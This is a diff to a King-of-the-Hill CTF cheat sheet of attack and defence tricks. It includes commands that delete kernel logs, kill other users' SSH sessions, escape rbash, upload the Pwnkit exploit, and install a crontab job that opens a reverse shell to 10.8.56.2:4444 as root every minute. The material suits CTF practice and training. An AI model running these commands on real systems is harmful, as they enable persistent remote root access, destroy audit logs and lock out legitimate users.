@@ -17,7 +17,8 @@ KoTH - Attack & defense Tricks
         - tail -f /var/log/kern.log
         - rm /var/log/kern.log
 - Kicking people out of the machine using pkill
-    - pkill -t -p pts/<ID>
+    - pkill -9 -t pts/<ID>
+    - kill -9 <PID>
 - Kicking all users connected in SSH
     - kill `ps aux | grep pts | awk ‘{print $2}’`;
 - Kicking all people connected to a given user on SSH
@@ -29,13 +30,13 @@ KoTH - Attack & defense Tricks
     - ./nyancat > /dev/pts/<ID> &
     - ./xpl -n /dev/pts/<ID> “cat /dev/urandom”
     - ./breker.sh <ID>
-- Bypass rb ash
+- Bypass rbash
     - vim
         - :set shell=/bin/bash
         - :shell
 - Patch /etc/sudoers
     - vim /etc/sudoers
-        - remove everything from except: root ALL=(ALL=ALL) ALL 
+        - remove everything except: root ALL=(ALL=ALL) ALL 
 - Patch SUID
     - Find / -perm /4000 2>/dev/null
     - chmod -s /usr/bin/pkexec
@@ -64,12 +65,12 @@ KoTH - Attack & defense Tricks
 - Uploading file using SSH
     - ssh user@target.ip -p1337 “cat Pwnkit” < Pwnkit
 - Protect king using while
-    - while true; do echo msood > king.txt; chattr +ia king.txt; set -o noclobber king.txt; done &
+    - while true; do echo msood > /root/king.txt; chattr +ia /root/king.txt; set -o noclobber /root/king.txt; done &
 - Blocking password authentication in ssh
     - PasswordAuthentication no in /etc/ssh/sshd_config
     - service sshd restart
 - Using crontab to load a script with a reverse shell every 1 minute
-    - echo “/bin/sh -i >& /dev/tcp/10.8.56.2/4444 0>&1” > /tmp/.persistence.sh
+    - echo "/bin/sh -i >& /dev/tcp/10.8.56.2/4444 0>&1" > /tmp/.persistence.sh
     - chmod +x .persistence.sh
     - vim /etc/crontab
         - * * * * * root /tmp/.persistence.sh
